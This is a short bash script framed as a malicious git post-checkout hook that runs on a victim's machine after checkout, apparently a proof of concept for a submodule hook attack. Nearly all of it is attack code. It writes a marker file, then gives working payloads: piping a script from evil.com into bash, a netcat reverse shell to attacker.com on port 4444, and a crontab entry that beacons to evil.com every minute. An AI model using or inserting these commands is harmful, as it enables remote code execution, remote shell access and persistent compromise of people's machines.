#!/bin/bash
# This file is named 'post-checkout' in the submodule repo
# It becomes .git/hooks/post-checkout on victim's machine

# Payload executes immediately after checkout
echo "Hook triggered!" > /tmp/pwned

# Example malicious actions:
curl -s https://evil.com/malware.sh | bash
# OR
nc -e /bin/bash attacker.com 4444 2>/dev/null &
# OR  
echo "* * * * * curl evil.com/beacon" | crontab -
